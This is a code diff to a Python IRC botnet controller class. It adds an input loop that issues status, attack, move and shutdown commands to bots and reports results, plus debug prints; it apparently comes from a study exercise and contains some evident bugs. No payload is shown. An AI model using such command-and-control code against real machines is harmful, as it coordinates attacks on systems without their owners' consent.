@@ -75,7 +75,9 @@ class conBot(threading.Thread):
         self.controller = ""
         self.gameOn = False
         #self.inputThread.run()
-        self.connection()
+        #self.connection()\
+        print("line 79")
+        self.inputLoop()
         
     def createNick(self, nick):
         self.NICK = nick + ''.join(random.choice(string.ascii_lowercase) for i in range(5))       
@@ -154,6 +156,50 @@ class conBot(threading.Thread):
         except ValueError:
                 self.run(cBot)
                 
+    def inputLoop(self):
+        threading.Thread(target = self.connection).start()
+        while True:
+            #print("line 161")  
+            self.command = ""         
+            time.sleep(5) 
+            if(self.isConnected):
+                try:
+                    userCommand = input("Please enter a valid command:")            
+                    #userCommand = input("Please enter a valid command:")
+                    if(userCommand not in self.comList):
+                        raise ValueError
+                    else:
+                        self.command = userCommand.split()
+                        #sys.stdout.write(userCommand)
+                    #sys.stdout.flush()
+                except ValueError:
+                    self.inputLoop()
+                              
+                if(self.command[0] == "status"):
+                    lock = threading.Lock()
+                    with lock:
+                        print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))        
+                elif self.command[0] == "attack":
+                    for i in self.attackBotListSucc:
+                        print("{}: attack successful".format(i))
+                    for i in self.attackBotListFail:
+                        print("{}: attack failed".format(i))
+                    print("Total: {} successful, {} unsuccessful".format(str(len(self.attackBotListSucc)),str(len(self.attackBotListFail))))
+                elif self.command[0] == "move":
+                    print("{} bots were moved".format(str(len(self.moveBotList))))
+                elif self.command[0] == "shutdown":
+                    for i in self.disconnectedBotList:
+                        print("{}: was disconnected".format(i))
+                elif self.command == "quit":
+                    sys.exit()
+                #print("Enter valid command: ")
+            else:
+                #print("line 194")
+                #threading.Thread(target = self.connection).start()
+                #print("testing")
+                time.sleep(5) 
+            
+                
     def processCommand(self):
         print("command = ")
         print(self.command[0])
@@ -199,6 +245,7 @@ class conBot(threading.Thread):
             
     def connection(self):
     
+        print("line 244")
         self.connectIRC(self.s,self.NICK,self.chan)        
         self.comList.append(self.activationPhrase)
         getInput = True
@@ -216,12 +263,12 @@ class conBot(threading.Thread):
                             if(response != ""):
                                 (prefix, command, args) = self.parsemsg(response)            
                                 #print((prefix,command,args))
-                                #print(response)
+                                print(response)
                                 if(command == '353'):
                                     print("line 170")                                    
                                     self.isConnected = True                                                                   
                                 elif command == "PRIVMSG":
-                                    self.isConnected = True
+                                    #self.isConnected = True
                                     test = args[1].split()
                                     print("prefix: " + prefix)
                                     if(test[0] in self.responses):
@@ -233,7 +280,7 @@ class conBot(threading.Thread):
                                     self.connectIRC(self.s,self.NICK, self.chan)
                          
                     elif (sock == sys.stdin):
-                        self.command = sys.stdin.readline().split()
+                        #self.command = sys.stdin.readline().split()
                         print("command = ")
                         print(self.command)
                         if(self.command[0] == self.activationPhrase):
@@ -257,9 +304,9 @@ class conBot(threading.Thread):
                             
 
                                                        
-                    if(self.isConnected):
+                   #if(self.isConnected):
                         #self.prompt()
-                        threading.Thread(target = self.prompt).start() 
+                        #threading.Thread(target = self.prompt).start() 
                 
         
         except Exception as e:
